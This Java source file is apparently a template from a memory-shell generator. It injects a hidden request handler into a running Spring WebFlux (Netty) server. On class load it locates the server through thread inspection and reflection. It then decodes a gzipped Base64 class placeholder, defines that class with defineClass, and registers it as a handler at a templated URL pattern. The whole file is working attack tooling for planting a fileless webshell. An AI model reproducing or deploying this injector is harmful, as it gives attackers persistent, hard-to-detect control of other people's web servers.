package com.reajason.javaweb.memshell.injector.springwebflux;

import org.springframework.util.Base64Utils;
import org.springframework.web.method.HandlerMethod;
import org.springframework.web.reactive.result.method.RequestMappingInfo;
import org.springframework.web.reactive.result.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.server.ServerWebExchange;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Collection;
import java.util.List;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class SpringWebFluxHandlerMethodInjector {

    static {
        new SpringWebFluxHandlerMethodInjector();
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public SpringWebFluxHandlerMethodInjector() {
        try {
            Object webHandler = getWebHandler();
            Object handlerMethod = getShell();
            inject(webHandler, handlerMethod);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Object getWebHandler() throws Exception {
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getClass().getName().contains("NettyWebServer")) {
                Object nettyWebServer = getFieldValue(thread, "this$0");
                Object reactorHttpHandlerAdapter = getFieldValue(nettyWebServer, "handler");
                Object httpHandler = getFieldValue(reactorHttpHandlerAdapter, "httpHandler");
                return getFieldValue(getFieldValue(getFieldValue(httpHandler, "delegate"), "delegate"), "delegate");
            }
        }
        return null;
    }

    private Object getShell() throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Object interceptor = null;
        try {
            interceptor = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(Base64Utils.decodeFromString(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            interceptor = clazz.newInstance();
        }
        return interceptor;
    }

    @SuppressWarnings("unchecked")
    public void inject(Object webHandler, Object handlerMethod) throws Exception {
        Object handler = getFieldValue(webHandler, "delegate");
        List<Object> handlerMappings = (List<Object>) invokeMethod(handler, "getHandlerMappings", null, null);
        RequestMappingHandlerMapping requestMappingHandlerMapping = null;
        for (Object handlerMapping : handlerMappings) {
            if (handlerMapping.getClass().getName().contains("RequestMappingHandlerMapping")) {
                requestMappingHandlerMapping = (RequestMappingHandlerMapping) handlerMapping;
                break;
            }
        }
        Collection<HandlerMethod> values = requestMappingHandlerMapping.getHandlerMethods().values();
        Method method = handlerMethod.getClass().getMethod("invoke", ServerWebExchange.class);
        for (HandlerMethod value : values) {
            if (value.getMethod().equals(method)) {
                System.out.println("handlerMethod already injected");
                return;
            }
        }
        RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(getUrlPattern()).build();
        invokeMethod(requestMappingHandlerMapping, "registerHandlerMethod", new Class[]{Object.class, Method.class, RequestMappingInfo.class}, new Object[]{handlerMethod, method, requestMappingInfo});
        System.out.println("handlerMethod inject successful");
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws
            Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        try (ByteArrayOutputStream out = new ByteArrayOutputStream();
             GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData))) {
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}
